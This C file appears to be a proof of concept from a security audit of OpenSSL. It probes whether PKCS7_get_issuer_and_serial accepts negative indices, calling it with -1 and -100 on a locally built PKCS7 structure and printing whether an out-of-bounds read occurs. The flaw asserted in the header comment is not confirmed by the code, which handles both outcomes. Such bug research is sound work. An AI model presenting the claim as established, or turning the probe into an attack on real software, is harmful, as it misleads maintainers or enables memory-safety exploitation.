/*
 * PoC for SF13: Negative array index in PKCS7_get_issuer_and_serial
 *
 * PKCS7_get_issuer_and_serial(PKCS7 *p7, int idx) does NOT check idx >= 0
 * Only checks: if (sk_PKCS7_RECIP_INFO_num(rsk) <= idx) return NULL;
 * A negative idx satisfies num > negative_idx, so the check passes,
 * and sk_PKCS7_RECIP_INFO_value(rsk, idx) is called with negative index.
 */
#include <openssl/pkcs7.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/objects.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <string.h>
#include <stdio.h>
#include <time.h>

static EVP_PKEY *make_rsa_key(void) {
    EVP_PKEY *pkey = NULL;
    EVP_PKEY_CTX *pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    if (!pctx) return NULL;
    if (EVP_PKEY_keygen_init(pctx) <= 0) goto err;
    if (EVP_PKEY_CTX_set_rsa_keygen_bits(pctx, 1024) <= 0) goto err;
    EVP_PKEY_keygen(pctx, &pkey);
err:
    EVP_PKEY_CTX_free(pctx);
    return pkey;
}

static X509 *make_cert(EVP_PKEY *pkey) {
    X509 *cert = X509_new();
    if (!cert) return NULL;
    X509_set_version(cert, 2);
    ASN1_INTEGER_set(X509_get_serialNumber(cert), 1);
    X509_gmtime_adj(X509_get_notBefore(cert), 0);
    X509_gmtime_adj(X509_get_notAfter(cert), 31536000L);
    X509_set_pubkey(cert, pkey);
    X509_NAME *name = X509_get_subject_name(cert);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC,
        (unsigned char *)"Test", -1, -1, 0);
    X509_set_issuer_name(cert, name);
    X509_sign(cert, pkey, EVP_sha256());
    return cert;
}

int main(void) {
    OPENSSL_init_crypto(0, NULL);

    PKCS7 *p7 = PKCS7_new();
    if (!p7) return 1;

    /* Must be signedAndEnveloped for this function */
    if (!PKCS7_set_type(p7, NID_pkcs7_signedAndEnveloped)) {
        fprintf(stderr, "PKCS7_set_type failed\n");
        PKCS7_free(p7);
        return 1;
    }

    /* Set cipher */
    if (!PKCS7_set_cipher(p7, EVP_aes_128_cbc())) {
        fprintf(stderr, "PKCS7_set_cipher failed\n");
        ERR_print_errors_fp(stderr);
        PKCS7_free(p7);
        return 1;
    }

    EVP_PKEY *pkey = make_rsa_key();
    X509 *cert = make_cert(pkey);

    /* Add a recipient so the stack has at least 1 element */
    PKCS7_RECIP_INFO *ri = PKCS7_add_recipient(p7, cert);
    if (!ri) {
        fprintf(stderr, "PKCS7_add_recipient failed\n");
        ERR_print_errors_fp(stderr);
        goto cleanup;
    }
    fprintf(stderr, "Added 1 recipient. Stack size: 1\n");
    fprintf(stderr, "num check: (1 <= -1) = %d\n",
        (1 <= -1));  /* shows the guard evaluates to 0 = allows negative */

    /* Call with negative index - this should access memory before the array */
    fprintf(stderr, "Calling PKCS7_get_issuer_and_serial with idx=-1...\n");
    PKCS7_ISSUER_AND_SERIAL *ias = PKCS7_get_issuer_and_serial(p7, -1);
    if (ias) {
        fprintf(stderr, "Got ias: %p (OOB read occurred!)\n", (void *)ias);
        /* Try to access the data - may crash */
        fprintf(stderr, "Accessing ias->issuer: %p\n", (void *)ias->issuer);
    } else {
        fprintf(stderr, "Returned NULL (guard worked)\n");
        ERR_print_errors_fp(stderr);
    }

    /* Also try idx=-100 */
    fprintf(stderr, "Calling with idx=-100...\n");
    ias = PKCS7_get_issuer_and_serial(p7, -100);
    if (ias) {
        fprintf(stderr, "Got ias: %p (OOB read occurred!)\n", (void *)ias);
    } else {
        fprintf(stderr, "Returned NULL\n");
    }

cleanup:
    X509_free(cert);
    EVP_PKEY_free(pkey);
    PKCS7_free(p7);
    return 0;
}
